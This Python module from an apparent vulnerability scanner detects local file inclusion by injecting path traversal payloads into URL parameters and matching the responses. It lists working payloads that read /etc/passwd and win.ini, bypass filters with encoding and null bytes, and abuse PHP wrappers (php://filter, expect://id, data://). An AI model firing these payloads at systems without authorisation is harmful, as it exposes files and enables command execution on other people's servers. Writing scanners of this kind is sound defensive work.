"""
asmon/modules/lfi_detection.py — Local File Inclusion / Path Traversal detection.
"""

import logging
import re
from typing import Optional
from urllib.parse import urlparse

from asmon.modules.base import (
    BaseModule, ModuleRegistry, Finding, FindingSeverity, FindingConfidence, FindingType,
)
from asmon.modules.http_utils import SecurityHTTPClient, inject_payload, get_params_from_url

logger = logging.getLogger("asmon.modules.lfi")

# Path traversal payloads
LFI_PAYLOADS = [
    # Linux targets
    ("../../../etc/passwd", ["root:x:", "root:*:", "/bin/bash", "/bin/sh"]),
    ("....//....//....//etc/passwd", ["root:x:", "root:*:"]),
    ("..%2f..%2f..%2fetc/passwd", ["root:x:", "root:*:"]),
    ("..%252f..%252f..%252fetc/passwd", ["root:x:"]),
    ("/etc/passwd", ["root:x:", "root:*:"]),
    ("file:///etc/passwd", ["root:x:", "root:*:"]),

    # Windows targets
    ("..\\..\\..\\windows\\win.ini", ["[fonts]", "[extensions]"]),
    ("....\\\\....\\\\....\\\\windows\\win.ini", ["[fonts]"]),
    ("C:\\windows\\win.ini", ["[fonts]", "[extensions]"]),
    ("file:///C:/windows/win.ini", ["[fonts]"]),

    # PHP wrappers
    ("php://filter/convert.base64-encode/resource=index.php", ["PD9waHA"]),  # <?php base64
    ("php://filter/read=string.rot13/resource=index.php", ["<?cuc", "<?CUC"]),
    ("expect://id", ["uid=", "gid="]),
    ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", ["phpinfo()"]),

    # Null byte bypass (legacy)
    ("../../../etc/passwd%00", ["root:x:", "root:*:"]),
    ("../../../etc/passwd%00.jpg", ["root:x:"]),
]

# Error patterns indicating traversal issues
ERROR_PATTERNS = [
    r"failed to open stream",
    r"No such file or directory",
    r"Warning.*include",
    r"Warning.*require",
    r"Warning.*file_get_contents",
    r"Warning.*fopen",
    r"Warning.*readfile",
    r"include_path",
    r"open_basedir restriction",
]


@ModuleRegistry.register
class LFIDetectionModule(BaseModule):
    """Detects Local File Inclusion and Path Traversal vulnerabilities."""

    name = "lfi_detection"
    description = "Detects LFI/path traversal via file content and error pattern matching"
    risk_level = "high"
    requires_authorization = True

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.http = SecurityHTTPClient(timeout=self.timeout, rate_limit=self.rate_limit, user_agent=self.user_agent)

    def run(self, target: dict) -> list[Finding]:
        self.findings = []
        url = target.get("url")
        if not url:
            return self.findings

        params = get_params_from_url(url)
        if not params:
            return self.findings

        self.logger.info("Testing %d parameters for LFI: %s", len(params), url)

        for param in params.keys():
            self._test_parameter(url, param)

        return self.findings

    def _test_parameter(self, url: str, param: str):
        for payload, signatures in LFI_PAYLOADS:
            test_url = inject_payload(url, param, payload)
            result = self.http.get(test_url)

            if not result.success or not result.response:
                continue

            body = result.response.body_preview

            # Check for file content signatures
            for sig in signatures:
                if sig in body:
                    self.add_finding(Finding(
                        finding_id=self.generate_finding_id("lfi", url, param, payload[:20]),
                        finding_type=FindingType.LFI_PATH_TRAVERSAL.value,
                        module=self.name,
                        severity=FindingSeverity.CRITICAL.value,
                        confidence=FindingConfidence.CONFIRMED.value,
                        host=urlparse(url).netloc.split(":")[0],
                        url=url,
                        parameter=param,
                        title=f"Local File Inclusion in parameter '{param}'",
                        description=f"Parameter '{param}' is vulnerable to LFI. File contents exposed.",
                        evidence={"payload": payload, "signature": sig, "parameter": param},
                        remediation="Validate and sanitize file paths. Use allowlists for file inclusion.",
                        cwe_ids=["CWE-22", "CWE-98"],
                    ))
                    return

            # Check for error patterns indicating vulnerability
            for pattern in ERROR_PATTERNS:
                if re.search(pattern, body, re.IGNORECASE):
                    self.add_finding(Finding(
                        finding_id=self.generate_finding_id("lfi_error", url, param),
                        finding_type=FindingType.LFI_PATH_TRAVERSAL.value,
                        module=self.name,
                        severity=FindingSeverity.MEDIUM.value,
                        confidence=FindingConfidence.MEDIUM.value,
                        host=urlparse(url).netloc.split(":")[0],
                        url=url,
                        parameter=param,
                        title=f"Potential LFI in parameter '{param}' (error-based)",
                        description="File operation errors suggest possible path traversal vulnerability.",
                        evidence={"payload": payload, "error_pattern": pattern},
                        remediation="Review file handling logic for user input.",
                        cwe_ids=["CWE-22"],
                    ))
                    return
